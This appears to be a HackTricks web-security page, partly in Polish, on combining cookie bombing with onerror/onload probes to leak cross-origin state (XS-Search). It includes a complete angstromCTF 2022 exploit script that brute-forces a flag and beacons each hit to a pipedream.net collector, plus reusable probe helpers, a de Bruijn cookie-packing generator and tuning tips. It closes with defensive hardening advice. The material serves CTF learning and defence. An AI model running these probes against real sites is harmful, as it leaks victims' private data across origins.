# Cookie Bomb + Onerror XS Leak

{{#include ../../banners/hacktricks-training.md}}

This technique combines:
- Cookie bombing: zapełnianie przeglądarki ofiary wieloma/dużymi ciasteczkami dla docelowego originu, tak żeby kolejne żądania osiągały limity serwera/żądania (rozmiar nagłówków żądania, rozmiar URL w redirectach itp.).
- Error-event oracle: sondowanie cross-origin endpointu za pomocą <script> (lub innego subresource) i rozróżnianie stanów przez onload vs onerror.

High level idea
- Znajdź docelowy endpoint, którego zachowanie różni się dla dwóch stanów, które chcesz przetestować (np. search “hit” vs “miss”).
- Upewnij się, że ścieżka “hit” wywoła ciężki chain przekierowań lub długi URL, podczas gdy ścieżka “miss” pozostanie krótka. Napompuj nagłówki żądania używając wielu ciasteczek tak, że tylko ścieżka “hit” spowoduje, że serwer przekroczy limit i zwróci błąd HTTP (np. 431/414/400). Błąd powoduje wywołanie onerror i staje się oraclem dla XS-Search.

When does this work
- Możesz spowodować, że przeglądarka ofiary wyśle ciasteczka do celu (np. ciasteczka są SameSite=None lub możesz ustawić je w kontekście first-party przez popup window.open).
- Aplikacja ma funkcję, którą można nadużyć, aby ustawić arbitralne cookies (np. endpointy “save preference”, które zamieniają kontrolowane nazwy/wartości inputów na Set-Cookie) lub aby zrobić post-auth redirects, które włączają dane kontrolowane przez atakującego do URL.
- Serwer reaguje inaczej w tych dwóch stanach i przy napompowanych nagłówkach/URL jeden ze stanów przekracza limit i zwraca odpowiedź błędu, która wywołuje onerror.

Note on server errors used as the oracle
- 431 Request Header Fields Too Large jest powszechnie zwracany, gdy ciasteczka napompowują nagłówki żądania; 414 URI Too Long lub specyficzny dla serwera 400 może być zwrócony dla długich targetów żądań. Każdy z tych przypadków powoduje niepowodzenie załadowania subresource i wywołuje onerror. [MDN documents 431 and typical causes like excessive cookies.]()

Practical example (angstromCTF 2022)
Poniższy skrypt (z publicznego writeupu) nadużywa funkcji pozwalającej atakującemu wstawić arbitralne ciasteczka, a następnie ładuje cross-origin search endpoint jako skrypt. Gdy zapytanie jest poprawne, serwer wykonuje redirect, który razem z nadmiarem ciasteczek przekracza limity serwera i zwraca status błędu, więc script.onerror się uruchamia; w przeciwnym razie nic się nie dzieje.
```html
<>'";
<form action="https://sustenance.web.actf.co/s" method="POST">
<input id="f" /><input name="search" value="a" />
</form>
<script>
const $ = document.querySelector.bind(document)
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))
let i = 0
const stuff = async (len = 3500) => {
let name = Math.random()
$("form").target = name
let w = window.open("", name)
$("#f").value = "_".repeat(len)
$("#f").name = i++
$("form").submit()
await sleep(100)
}
const isError = async (url) => {
return new Promise((r) => {
let script = document.createElement("script")
script.src = url
script.onload = () => r(false)
script.onerror = () => r(true)
document.head.appendChild(script)
})
}
const search = (query) => {
return isError(
"https://sustenance.web.actf.co/q?q=" + encodeURIComponent(query)
)
}
const alphabet =
"etoanihsrdluc_01234567890gwyfmpbkvjxqz{}ETOANIHSRDLUCGWYFMPBKVJXQZ"
const url = "//en4u1nbmyeahu.x.pipedream.net/"
let known = "actf{"
window.onload = async () => {
navigator.sendBeacon(url + "?load")
await Promise.all([stuff(), stuff(), stuff(), stuff()])
await stuff(1600)
navigator.sendBeacon(url + "?go")
while (true) {
for (let c of alphabet) {
let query = known + c
if (await search(query)) {
navigator.sendBeacon(url, query)
known += c
break
}
}
}
}
</script>
```
Dlaczego popup (window.open)?
- Nowoczesne przeglądarki coraz częściej blokują third‑party cookies. Otwarcie top-level window do celu sprawia, że cookies stają się first‑party, więc odpowiedzi Set-Cookie od celu zostaną zastosowane, umożliwiając krok cookie-bomb nawet przy ograniczeniach third‑party cookies.

2024–2025 notes on cookie availability
- Przeglądarki oparte na Chromium nadal często wysyłają third‑party cookies, chyba że użytkownik lub serwis zrezygnuje, ale Safari i Firefox domyślnie blokują większość third‑party cookies. Planuj oba przypadki: (1) użyj first‑party cookie planting flow (window.open + auto-submit do cookie-setting endpoint) a następnie (2) przebadaj za pomocą subresource, który powiedzie się tylko wtedy, gdy te cookies zostaną wysłane. Jeśli third‑party cookies są zablokowane, przenieś probe do same-site kontekstu (np. uruchom oracle w popupie przez same-site gadget i exfiltrate boolean przez postMessage lub beacon do twojego serwera).

Generic probing helper
Jeśli masz już sposób na ustawienie wielu cookies na originie celu (first‑party), możesz ponownie użyć tego minimalnego oracle przeciwko dowolnemu endpointowi, którego sukces/niepowodzenie prowadzi do różnych efektów sieciowych (status/MIME/redirect):
```js
function probeError(url) {
return new Promise((resolve) => {
const s = document.createElement('script');
s.src = url;
s.onload = () => resolve(false);  // loaded successfully
s.onerror = () => resolve(true);  // failed (e.g., 4xx/5xx, wrong MIME, blocked)
document.head.appendChild(s);
});
}
```
Alternatywny tag oracle (stylesheet)
```js
function probeCSS(url) {
return new Promise((resolve) => {
const l = document.createElement('link');
l.rel = 'stylesheet';
l.href = url;
l.onload = () => resolve(false);
l.onerror = () => resolve(true);
document.head.appendChild(l);
});
}
```
Zaawansowane: de Bruijn–based cookie packing (CTF-proven)
- Gdy aplikacja pozwala ci kontrolować duże wartości cookie, możesz efektywnie pakować zgadywania, doklejając do każdej probe sekwencję de Bruijn. To utrzymuje narzut per‑probe niewielki, jednocześnie zapewniając, że heavy branch jest konsekwentnie cięższy tylko dla właściwego prefixu. Przykładowy generator dla |Σ| symboli długości n (mieści się w wartości cookie):
```js
const ALPH = '_{}0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
function deBruijn(k, n, alphabet=ALPH){
const a = Array(k * n).fill(0), seq=[];
(function db(t,p){
if(t>n){ if(n%p===0) for(let j=1;j<=p;j++) seq.push(a[j]); }
else { a[t]=a[t-p]; db(t+1,p); for(let j=a[t-p]+1;j<k;j++){ a[t]=j; db(t+1,t);} }
})(1,1);
return seq.map(i=>alphabet[i]).join('');
}
```
- Pomysł w praktyce: ustaw wiele cookies whose values are prefix + deBruijn(k,n). Only when the tested prefix is correct does the server take the heavy path (e.g., extra redirect reflecting the long cookie or URL), which, combined with the cookie bloat, crosses limits and flips onerror. See a LA CTF 2024 public solver using this approach.

Tips to build the oracle
- Wymuś, by stan „pozytywny” był cięższy: chain an extra redirect only when the predicate is true, or make the redirect URL reflect unbounded user input so it grows with the guessed prefix.
- Napompuj nagłówki: repeat cookie bombing until a consistent error is observed on the “heavy” path. Serwery często cap header size i zawiodą wcześniej, gdy obecnych jest wiele cookies.
- Ustabilizuj: fire multiple parallel cookie set operations and probe repeatedly to average out timing and caching noise.
- Wymuś omijanie cache'ów i unikaj artefaktów poolingu: dodaj losowy `#fragment` lub `?r=` do probe URLs, i prefer distinct window names when using window.open loops.
- Zmieniaj subresources: jeśli `<script>` jest filtrowany, spróbuj `<link rel=stylesheet>` lub `<img>`. The onload/onerror boolean is the oracle; content never needs to be parsed.

Common header/URL limits (useful thresholds)
- Reverse proxies/CDNs and servers enforce different caps. As of October 2025, Cloudflare documents 128 KB total for request headers (and 16 KB URL) on the edge, so you may need more/larger cookies when targets sit behind it. Other stacks (e.g., Apache via LimitRequestFieldSize) are often closer to ~8 KB per header line and will hit errors earlier. Adjust bomb size accordingly. [Cloudflare docs show the 128 KB header limit.]

Related XS-Search tricks
- URL length based oracles (no cookies needed) can be combined or used instead when you can force a very long request target:

{{#ref}}
url-max-length-client-side.md
{{#endref}}

Defenses and hardening
- Make success/failure responses indistinguishable:
- Avoid conditional redirects or large differences in response size between states. Return the same status, same content type, and similar body length regardless of state.
- Block cross-site subresource probes:
- SameSite cookies: set sensitive cookies to SameSite=Lax or Strict so subresource requests like <script src> don’t carry them; prefer Strict for auth tokens when possible.
- Fetch Metadata: enforce a Resource Isolation Policy to reject cross-site subresource loads (e.g., if Sec-Fetch-Site != same-origin/same-site).
- Cross-Origin-Resource-Policy (CORP): set CORP: same-origin (or at least same-site) for endpoints not meant to be embedded as cross-origin subresources.
- X-Content-Type-Options: nosniff and correct Content-Type on JSON/HTML endpoints to avoid load-as-script quirks.
- Reduce header/URL amplification:
- Cap the number/size of cookies set; sanitize features that turn arbitrary form fields into Set-Cookie.
- Normalize or truncate reflected data in redirects; avoid embedding attacker-controlled long strings in Location URLs.
- Keep server limits consistent and fail uniformly (avoid special error pages only for one branch).

Notes
- This class of attacks is discussed broadly as “Error Events” XS-Leaks. The cookie-bomb step is just a convenient way to push only one branch over server limits, producing a reliable boolean oracle.



## References
- XS-Leaks: Error Events (onerror/onload as an oracle): https://xsleaks.dev/docs/attacks/error-events/
- MDN: 431 Request Header Fields Too Large (common with many cookies): https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/431
- LA CTF 2024 writeup note showing a de Bruijn cookie-bomb oracle: https://gist.github.com/arkark/5787676037003362131f30ca7c753627
- Cloudflare edge limits (URLs 16 KB, request headers 128 KB): https://developers.cloudflare.com/fundamentals/reference/connection-limits/
{{#include ../../banners/hacktricks-training.md}}
